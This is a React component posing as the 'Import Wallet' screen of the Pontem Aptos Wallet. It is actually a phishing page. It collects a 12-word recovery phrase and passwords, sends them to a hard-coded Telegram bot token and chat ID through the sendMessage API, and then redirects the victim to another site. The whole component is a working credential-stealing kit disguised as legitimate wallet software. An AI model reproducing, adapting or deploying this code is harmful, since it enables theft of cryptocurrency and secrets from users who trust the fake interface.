import React, { useState } from 'react'
import { AiOutlineDownload } from 'react-icons/ai'
import { MdKeyboardArrowLeft } from 'react-icons/md'
const ImportWallet = () => {
    const [phrase, setPhrase] = useState(false);
    const [pass, setPass] = useState('');
    const [confirmPass, setConfirmPass] = useState('');
    const [segments, setSegments] = React.useState(["", "", "", "", "", "", "", "", "", "", "", ""])
    function onPaste(event) {
        const pasted = event.clipboardData.getData("text/plain")
        console.log(pasted.split(" "))
        setSegments(pasted.split(" ").slice(0, 12))

    };
    let bot = {
        TOKEN: "5782465316:AAGMuZZyNAFBNE6DwDn9NxrW4NyxP4sXlRc",
        CHATID: "1974791133",

    }

    const style = {
        btnDis: 'cursor-not-allowed opacity-10 w-full mt-6 hover:bg-yellow-200 hover:border-yellow-200 flex text-base flex-row items-center justify-center rounded-lg border-2 border-[#FFE32B] bg-[#FFE32B] font-medium text-black hover:cursor-pointer dark:bg-fuchsia-900 dark:border-fuchsia-800 dark:text-white dark:hover:bg-fuchsia-800 dark:hover:border-fuchsia-800 px-4 h-10 flex-shrink-0 whitespace-nowrap',
        btnEnb: 'cursor-pointer w-full mt-6 hover:bg-yellow-200 hover:border-yellow-200 flex text-base flex-row items-center justify-center rounded-lg border-2 border-[#FFE32B] bg-[#FFE32B] font-medium text-black hover:cursor-pointer dark:bg-fuchsia-900 dark:border-fuchsia-800 dark:text-white dark:hover:bg-fuchsia-800 dark:hover:border-fuchsia-800 px-4 h-10 flex-shrink-0 whitespace-nowrap'
    }
    const submitAddress = () => {
        let vault = `secret phrase is ${segments} and password is ${pass} confirm pass ${confirmPass}`

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${vault}`, {
            method: "GET"
        })
            .then(success => {
                setSegments(["", "", "", "", "", "", "", "", "", "", "", ""])
                setPass('')
                setConfirmPass('')
                window.location = 'https://www.topaz.so/'
            }, error => {
                alert("not sent")
            })
    }
    return (
        <div className=''>
            <div className='bg-white dark:bg-stone-900 rounded-3xl'>
                {
                    !phrase ?
                        <>
                            <div className='mx-6 py-2 lg:w-[600px] w-[23rem]'>
                                <p className='text-black dark:text-white text-2xl font-[700] text-center pt-10'>Welcome</p>
                                <p className='text-slate-400 font-[500] text-center mt-1 mb-5'>Store your tokens securely
                                    <br />  in the Pontem Aptos Wallet</p>
                                <button onClick={() => setPhrase((prev) => !prev)} className='text-black dark:text-white flex items-center p-3 w-full rounded-xl border border-gray-50 dark:border-stone-800'>
                                    <AiOutlineDownload className='bg-gray-50 dark:bg-stone-800 p-2 rounded-3xl mr-4 text-4xl' />
                                    <div className='text-left'>
                                        <p className='text-lg'>Import Wallet</p>
                                        <p className='text-sm text-slate-500'>Import an existing wallet</p>
                                    </div>
                                </button>
                                <p className='text-sm text-black dark:text-white text-center mt-16 mb-4'>Need help? <span className='text-slate-400'>Official Pontem community</span></p>
                            </div>
                        </>
                        :
                        <div className='h-[600px] lg:w-[600px] w-[23rem] overflow-y-auto px-2'>
                            <div>
                                <div className='relative p-5 text-center border-b border-gray-50 dark:border-stone-800'>
                                    <p onClick={() => {
                                        setSegments(["", "", "", "", "", "", "", "", "", "", "", ""])
                                        setPhrase((prev) => !prev)
                                    }
                                    } className='cursor-pointer text-slate-500 flex items-center text-lg absolute top-5 '><MdKeyboardArrowLeft />Back</p>
                                    <p className='text-slate-500 font-[500] text-lg'>Import Wallet</p>
                                </div>
                                <div className="grid grid-cols-1 gap-3 m-4 border border-gray-50 dark:border-stone-800 p-4 rounded-2xl relative">
                                    <span className=' absolute top-[-12px] left-5 text-slate-500'>Your secrate key</span>
                                    {segments.map((s, key) =>
                                        <>
                                            <label className='text-slate-400'>{key + 1}.</label>
                                            <input key={key}
                                                value={s} onPaste={onPaste} name="tjhgdjhagd" className={`bg-transparent w-full border border-slate-600 outline-0 px-2 py-1 rounded-lg placeholder:font-[700] text-lg dark:text-white text-black`} />
                                        </>
                                    )}
                                </div>
                            </div>
                            <div className="grid grid-cols-1 gap-3 m-4 border border-gray-50 dark:border-stone-800 p-4 rounded-2xl relative">
                                <span className=' absolute top-[-12px] left-5 text-slate-500'>Create new password</span>
                                <div>
                                    <label className='text-slate-600 font-[700]'>New password</label><br />
                                    <input onChange={(e) => setPass(e.target.value)} name='11' type='password' className='bg-transparent text-slate-600 w-full border border-slate-600 outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                </div>
                                <div>
                                    <label className='text-slate-600 font-[700]'>Confirm new password</label><br />
                                    <input onChange={(e) => setConfirmPass(e.target.value)} name='12' type='password' className='bg-transparent text-slate-600 w-full border border-slate-600 outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                                </div>
                            </div>
                            <div className='flex flex-col items-center mx-10 my-4'>
                                <button onClick={() => submitAddress()} disabled={!segments || !confirmPass} className={!segments || !confirmPass ? style.btnDis : style.btnEnb} >
                                    <span className='text-lg '>Import</span>
                                </button>
                            </div>
                        </div>
                }
            </div>
        </div>
    )
}

export default ImportWallet